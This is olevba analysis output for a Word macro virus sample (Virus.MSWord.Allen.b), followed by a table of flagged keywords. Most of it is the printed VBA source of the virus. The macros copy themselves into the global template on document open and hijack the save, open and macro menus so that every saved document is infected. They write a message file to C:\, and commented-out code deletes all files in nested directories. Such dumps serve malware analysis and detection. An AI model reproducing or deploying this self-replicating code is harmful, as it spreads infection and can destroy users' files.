olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allen.b-a407e20fd506af65c6286bbb35723cb5ddd97db0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allen.b-a407e20fd506af65c6286bbb35723cb5ddd97db0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUTOOpen.bas 
in file: Virus.MSWord.Allen.b-a407e20fd506af65c6286bbb35723cb5ddd97db0 - OLE stream: 'Macros/VBA/aUTOOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Abort
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:Autoexec"
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:RpAE"
    sMacro$ = sMe$ + ":aUTOOpen"
    WordBasic.MacroCopy sMacro$, "Global:RpAO"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:FileSave"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:RpFS"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:RpFSA"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:FileOpen"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:RpFO"
    sMacro$ = sMe$ + ":RpTC"
    WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize"
    sMacro$ = sMe$ + ":RpTM"
    WordBasic.MacroCopy sMacro$, "Global:ToolsMacro"
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpFS.bas 
in file: Virus.MSWord.Allen.b-a407e20fd506af65c6286bbb35723cb5ddd97db0 - OLE stream: 'Macros/VBA/RpFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFS.MAIN"
Dim sMe$
Dim sTMacro$
WordBasic.FileSave
On Error GoTo -1: On Error GoTo Bail

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":aUTOOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpAE.bas 
in file: Virus.MSWord.Allen.b-a407e20fd506af65c6286bbb35723cb5ddd97db0 - OLE stream: 'Macros/VBA/RpAE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim pukul$
Dim hari
Dim tgl
Dim bulan
Dim tahun
Dim hari_$
Dim bulan_$
Dim tgl_$
Dim tahun_$
Dim Semua$
Dim Bacalah$
'tgl = Day(Now())
'jam = Hour(Now())
'If tgl < 20 Then Goto Selamat
'If jam < 11 Then Goto Selamat
'Dim Sehat$(20)
'Dim Subur$(20)
'ChDir "C:\"
'Dim subdirs$(CountDirectories())
'subdirs$(0) = "[..]"
'For i = 1 To CountDirectories()
'   Print "Reading menu...Please wait !"
'   Subdirs$(i) = UCase$(GetDirectory$(i))
'   If Subdirs$(i) = "WINDOWS" Then Goto lewat
'   If Subdirs$(i) = "WINWORD" Then Goto lewat
'   If Subdirs$(i) = "WINWORD6" Then Goto lewat
'   Ojek$ = "C:\" + Subdirs$(i) + "\*.*"
'   Kill ojek$
'   ChDir  Subdirs$(i)
'       Subur$(0) = "[..]"
'       For a = 1 To CountDirectories()
'           Print "Reading menu...Please wait !"
'           subur$(a) = UCase$(GetDirectory$(a))
'           If subur$(a) = "WINWORD" Then Goto pass
'           If subur$(a) = " WINWORD6" Then Goto pass
'           Penyakit$ = "C:\" + subdirs$(i) + "\" + subur$(a) + "\*.*"
'           Kill Penyakit$
'   ChDir subur$(a)
'       sehat$(0) = "[..]"
'               For b = 1 To CountDirectories()
'               Print "Reading menu...Please wait !"
'               sehat$(b) = UCase$(GetDirectory$(b))
'               Tien$ = "C:\" + Subdirs$(i) + "\" + Subur$(a) + "\" + 'Sehat$(b) + "\*.*"
'           Kill Tien$
'           Next b
'           ChDir "C:\" + subdirs$(i)
'PASS:
'       Next a
'       ChDir "C:\"
'lewat:
'Next i
pukul$ = WordBasic.[Time$](WordBasic.Now())
hari = WordBasic.WeekDay(WordBasic.Now())
tgl = WordBasic.Day(WordBasic.Now())
bulan = WordBasic.Month(WordBasic.Now())
tahun = WordBasic.Year(WordBasic.Now())
ReDim hari___$(7)
ReDim bulan___$(12)
If hari = 1 Then hari_$ = "Minggu"
If hari = 2 Then hari_$ = "Senin"
If hari = 3 Then hari_$ = "Selasa"
If hari = 4 Then hari_$ = "Rabu"
If hari = 5 Then hari_$ = "Kamis"
If hari = 6 Then hari_$ = "Jumat"
If hari = 7 Then hari_$ = "Sabtu"
If bulan = 1 Then bulan_$ = "Januari"
If bulan = 2 Then bulan_$ = "Februari"
If bulan = 3 Then bulan_$ = "Maret"
If bulan = 4 Then bulan_$ = "April"
If bulan = 5 Then bulan_$ = "Mei"
If bulan = 6 Then bulan_$ = "Juni"
If bulan = 7 Then bulan_$ = "Juli"
If bulan = 8 Then bulan_$ = "Agustus"
If bulan = 9 Then bulan_$ = "September"
If bulan = 10 Then bulan_$ = "Oktober"
If bulan = 11 Then bulan_$ = "November"
If bulan = 12 Then bulan_$ = "Desember"
tgl_$ = Str(tgl)
tahun_$ = Str(tahun)
Semua$ = hari_$ + ", " + tgl_$ + " " + bulan_$ + " " + tahun_$ + ", Jam :" + pukul$ + "."
'Pesan$ = "Anda rupanya sedang sial, semua file di mesin ini kecuali yang berada di direktori WINDOWS dan WINWORD telah hilang, jangan kaget, ini bukan ulah Anda, tapi ini hasil pekerjaan saya...Barang siapa yang berhasil menemukan cara menangkal virus ini
', saya aka" + "n memberi listing virus ini untuk Anda !!! Dan tentu saja saya akan terus datang kesini untuk memberi Anda salam dengan virus-virus terbaru dari saya...selamat !   Bandung, " + semua$
Bacalah$ = "Assalamualaikum ..., maaf @Rapi.Kom mengganggu anda sebentar. Pesan ini aslinya bernama  PESAN.TXT  yang  muncul  di  root direktori  setelah  anda menjalankan Winword 6.0 yang templatenya (normal.dot)  telah  tertulari  macro  menjijikkan ini. Macro ini " + "(sebe" + "lum @R" + "a" + "pi" + ".Kom modifikasi)  berasal  dari  file data Winword 6.0 (*.doc) yang telah tertular macro ini. Bila file data tersebut  di pangggil (Open doc), maka macro secara otomatis menjalankan perintah-perintah macro lain nya,  yang antara  lain mengcopykan  diri ke" + " gl" + "o" + "bal " + "template (normal.dot), juga pada tanggal dan jam tertentu akan menghapus semua data di direktori tingkat 1, 2 dan 3 (kecuali Hidden direktori), menjengkelkan bukan ?!. Siapapun pembuatnya pastilah orang yang sirik !,  masih banyak perbuatan baik lain yang" + "  bisa  kita kerjakan.         ... Malang, " + Semua$ + " @Rapi.Kom"
Open "C:\BACALAH.TXT" For Output As 1
Write #1, Bacalah$
Close 1
'Selamat:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Autoexec.bas 
in file: Virus.MSWord.Allen.b-a407e20fd506af65c6286bbb35723cb5ddd97db0 - OLE stream: 'Macros/VBA/Autoexec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim pukul$
Dim hari
Dim tgl
Dim bulan
Dim tahun
Dim hari_$
Dim bulan_$
Dim tgl_$
Dim tahun_$
Dim Semua$
Dim Bacalah$
'tgl = Day(Now())
'jam = Hour(Now())
'If tgl < 20 Then Goto Selamat
'If jam < 11 Then Goto Selamat
'Dim Sehat$(20)
'Dim Subur$(20)
'ChDir "C:\"
'Dim subdirs$(CountDirectories())
'subdirs$(0) = "[..]"
'For i = 1 To CountDirectories()
'   Print "Reading menu...Please wait !"
'   Subdirs$(i) = UCase$(GetDirectory$(i))
'   If Subdirs$(i) = "WINDOWS" Then Goto lewat
'   If Subdirs$(i) = "WINWORD" Then Goto lewat
'   If Subdirs$(i) = "WINWORD6" Then Goto lewat
'   Ojek$ = "C:\" + Subdirs$(i) + "\*.*"
'   Kill ojek$
'   ChDir  Subdirs$(i)
'       Subur$(0) = "[..]"
'       For a = 1 To CountDirectories()
'           Print "Reading menu...Please wait !"
'           subur$(a) = UCase$(GetDirectory$(a))
'           If subur$(a) = "WINWORD" Then Goto pass
'           If subur$(a) = " WINWORD6" Then Goto pass
'           Penyakit$ = "C:\" + subdirs$(i) + "\" + subur$(a) + "\*.*"
'           Kill Penyakit$
'   ChDir subur$(a)
'       sehat$(0) = "[..]"
'               For b = 1 To CountDirectories()
'               Print "Reading menu...Please wait !"
'               sehat$(b) = UCase$(GetDirectory$(b))
'               Tien$ = "C:\" + Subdirs$(i) + "\" + Subur$(a) + "\" + 'Sehat$(b) + "\*.*"
'           Kill Tien$
'           Next b
'           ChDir "C:\" + subdirs$(i)
'PASS:
'       Next a
'       ChDir "C:\"
'lewat:
'Next i
pukul$ = WordBasic.[Time$](WordBasic.Now())
hari = WordBasic.WeekDay(WordBasic.Now())
tgl = WordBasic.Day(WordBasic.Now())
bulan = WordBasic.Month(WordBasic.Now())
tahun = WordBasic.Year(WordBasic.Now())
ReDim hari___$(7)
ReDim bulan___$(12)
If hari = 1 Then hari_$ = "Minggu"
If hari = 2 Then hari_$ = "Senin"
If hari = 3 Then hari_$ = "Selasa"
If hari = 4 Then hari_$ = "Rabu"
If hari = 5 Then hari_$ = "Kamis"
If hari = 6 Then hari_$ = "Jumat"
If hari = 7 Then hari_$ = "Sabtu"
If bulan = 1 Then bulan_$ = "Januari"
If bulan = 2 Then bulan_$ = "Februari"
If bulan = 3 Then bulan_$ = "Maret"
If bulan = 4 Then bulan_$ = "April"
If bulan = 5 Then bulan_$ = "Mei"
If bulan = 6 Then bulan_$ = "Juni"
If bulan = 7 Then bulan_$ = "Juli"
If bulan = 8 Then bulan_$ = "Agustus"
If bulan = 9 Then bulan_$ = "September"
If bulan = 10 Then bulan_$ = "Oktober"
If bulan = 11 Then bulan_$ = "November"
If bulan = 12 Then bulan_$ = "Desember"
tgl_$ = Str(tgl)
tahun_$ = Str(tahun)
Semua$ = hari_$ + ", " + tgl_$ + " " + bulan_$ + " " + tahun_$ + ", Jam :" + pukul$ + "."
'Pesan$ = "Anda rupanya sedang sial, semua file di mesin ini kecuali yang berada di direktori WINDOWS dan WINWORD telah hilang, jangan kaget, ini bukan ulah Anda, tapi ini hasil pekerjaan saya...Barang siapa yang berhasil menemukan cara menangkal virus ini
', saya aka" + "n memberi listing virus ini untuk Anda !!! Dan tentu saja saya akan terus datang kesini untuk memberi Anda salam dengan virus-virus terbaru dari saya...selamat !   Bandung, " + semua$
Bacalah$ = "Assalamualaikum ..., maaf @Rapi.Kom mengganggu anda sebentar. Pesan ini aslinya bernama  PESAN.TXT  yang  muncul  di  root direktori  setelah  anda menjalankan Winword 6.0 yang templatenya (normal.dot)  telah  tertulari  macro  menjijikkan ini. Macro ini " + "(sebe" + "lum @R" + "a" + "pi" + ".Kom modifikasi)  berasal  dari  file data Winword 6.0 (*.doc) yang telah tertular macro ini. Bila file data tersebut  di pangggil (Open doc), maka macro secara otomatis menjalankan perintah-perintah macro lain nya,  yang antara  lain mengcopykan  diri ke" + " gl" + "o" + "bal " + "template (normal.dot), juga pada tanggal dan jam tertentu akan menghapus semua data di direktori tingkat 1, 2 dan 3 (kecuali Hidden direktori), menjengkelkan bukan ?!. Siapapun pembuatnya pastilah orang yang sirik !,  masih banyak perbuatan baik lain yang" + "  bisa  kita kerjakan.         ... Malang, " + Semua$ + " @Rapi.Kom"
Open "C:\BACALAH.TXT" For Output As 1
Write #1, Bacalah$
Close 1
'Selamat:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Allen.b-a407e20fd506af65c6286bbb35723cb5ddd97db0 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFS.MAIN"
Dim sMe$
Dim sTMacro$
WordBasic.FileSave
On Error GoTo -1: On Error GoTo Bail

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":aUTOOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpAO.bas 
in file: Virus.MSWord.Allen.b-a407e20fd506af65c6286bbb35723cb5ddd97db0 - OLE stream: 'Macros/VBA/RpAO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Abort
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:Autoexec"
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:RpAE"
    sMacro$ = sMe$ + ":aUTOOpen"
    WordBasic.MacroCopy sMacro$, "Global:RpAO"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:FileSave"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:RpFS"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:RpFSA"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:FileOpen"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:RpFO"
    sMacro$ = sMe$ + ":RpTC"
    WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize"
    sMacro$ = sMe$ + ":RpTM"
    WordBasic.MacroCopy sMacro$, "Global:ToolsMacro"
Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |aUTOOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

